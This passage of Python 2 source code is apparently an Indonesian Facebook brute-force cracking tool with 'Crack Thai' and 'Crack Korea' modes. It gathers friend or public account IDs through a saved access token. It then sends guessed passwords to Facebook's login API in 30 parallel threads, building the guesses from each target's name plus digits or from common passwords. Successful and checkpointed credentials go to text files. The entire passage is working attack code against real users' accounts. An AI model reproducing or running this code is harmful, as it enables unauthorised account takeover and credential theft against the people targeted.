                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    cek = open('done/thai.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '1234'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        oke = open('done/thai.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        cek = open('done/thai.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'Krace\xc4\xab\xcc\x81yw'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;9=m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            oke = open('done/thai.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            cek = open('done/thai.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'lovely'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                oke = open('done/thai.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                cek = open('done/thai.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    oke = open('done/thai.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    cek = open('done/thai.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        oke = open('done/thai.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        cek = open('done/thai.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '12345'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            oke = open('done/thai.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            cek = open('done/thai.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSelesai ...'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone thai.'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m) ')
    os.system('python2 Crackv1.py')


def crack_korea():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print ' '
    print '\x1b[1;97m _________   ________.    '
    print '\x1b[1;97m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
    print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
    print '\x1b[1;94m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
    print '\x1b[1;97m  \\______  /|__|   |___  /'
    print '\x1b[1;97m         \\/            \\/ '
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mKorea\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m(\x1b[1;97m1\x1b[1;94m) \x1b[1;97mCrack Dari Daftar Teman'
    print '\x1b[1;94m(\x1b[1;97m2\x1b[1;94m)\x1b[1;97m Crack Dari Id Teman/Publik'
    print '\x1b[1;94m(\x1b[1;97m3\x1b[1;94m)\x1b[1;97m Crack Dari File'
    print '\x1b[1;94m(\x1b[1;91m0\x1b[1;94m) \x1b[1;97mKembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_korea()


def pilih_korea():
    teak = raw_input('\x1b[1;97m(?) Pilih \x1b[94m> \x1b[1;97m ')
    if teak == '':
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih_korea()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print ' '
            print '\x1b[1;97m _________   ________.    '
            print '\x1b[1;97m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;94m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;97m  \\______  /|__|   |___  /'
            print '\x1b[1;97m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '              \x1b[1;94m>>> \x1b[1;93mCRACK KOREA \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print ' '
            print '\x1b[1;97m _________   ________.    '
            print '\x1b[1;97m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;94m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;97m  \\______  /|__|   |___  /'
            print '\x1b[1;97m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '              \x1b[1;94m>>> \x1b[1;93mCRACK KOREA \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            idt = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) ID Publik \x1b[1;91m:\x1b[1;97m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama Akun \x1b[1;91m:\x1b[1;97m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) ID publik Tidak Ada!'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_korea()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Tidak ada koneksi !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print ' '
            print '\x1b[1;97m _________   ________.    '
            print '\x1b[1;97m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;94m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;97m  \\______  /|__|   |___  /'
            print '\x1b[1;97m         \\/            \\/ '
            try:
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                print '              \x1b[1;94m>>> \x1b[1;93mCRACK KOREA \x1b[1;94m<<<'
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mNama File\x1b[1;91m :\x1b[1;97m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada ! '
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali \x1b[1;97m)')
            except IOError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada !'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_korea()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
            pilih_korea()
        print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\x1b[0m'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\x1b[0m'
    print 50 * '\x1b[1;94m\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;97m%H\x1b[1;97m:\x1b[1;97m%M\x1b[1;97m:\x1b[1;97m%S')))
            sys.stdout.flush()
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                oke = open('done/korea.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                cek = open('done/korea.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    oke = open('done/korea.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    cek = open('done/korea.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '1234'
